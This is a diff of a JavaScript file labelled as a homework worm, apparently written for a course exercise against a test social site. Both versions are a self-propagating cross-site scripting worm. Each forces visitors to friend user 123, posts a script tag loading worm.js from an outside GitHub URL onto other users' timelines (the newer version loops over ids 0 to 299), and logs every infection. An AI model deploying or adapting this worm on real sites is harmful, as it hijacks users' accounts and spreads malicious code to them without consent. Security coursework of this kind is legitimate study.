@@ -1,33 +1,30 @@
 // Worm For HW6
 
-// Get the user to friend me
-$.get("add_friend.php", {'id': 123})
-
-// Loop through their friends and post worm on their pages
-// TODO:
-// This line gets a user id as index[0]
-$.get("friends.php", function(friends){
-    // Always start second split at index[1] to avoid garbage
-    myFriends = friends.split("?id=")
-    for(var i = 1; i < myFriends.length; i++){
-        friendID = myFriends[i].split("'>");
-        // Call the function to post to the victims page
-        report(friendID)
-    }
-});
-
-// Function to post worm on a person's page
-function spread(id){
-    $.get("add_comment.php", {'id': id, 'comment': "<script src='https://raw.githubusercontent.com/P0nt14c/web/main/worm.js'></script>"})
+// add myself as a friend
+function add_friend() {
+    var request = new XMLHttpRequest();
+    request.open("GET", `/add_friend.php?id=123`, true);
+    request.send();
 }
 
-function report(id){
-    // Post report on my page
-    $.get("timeline.php", {'id': 123}, function(timeline){
-        // Check if they have posted already
-        if(!timeline.includes(id + ":worm")){
-            $.get("/add_comment.php", {'id': 123, 'comment': id + ":worm " + new Date(Date.now()).toLocaleString()})
-            spread(friendID)
-        }
-    })
+add_friend();
+
+// posts a comment on the user timeline. 
+function add_comment(user_id, comment) {
+    var request = new XMLHttpRequest();
+    request.open("GET", `/add_comment.php?id=${user_id}&comment=${encodeURIComponent(comment)}`, true);
+    request.send();
+}
+
+// posts a comment on my timeline
+function add_report_comment(user_id) {
+    add_comment(123, `New Friend Acquired: ${user_id}`)
+}
+
+// worm that loops
+for(let user_id = 0; user_id < 300; user_id++) {
+    if (user_id != 123) {
+        add_comment(user_id, "<script src='https://raw.githubusercontent.com/P0nt14c/web/main/worm.js></script>")
+        add_report_comment(user_id);
+    }
 }
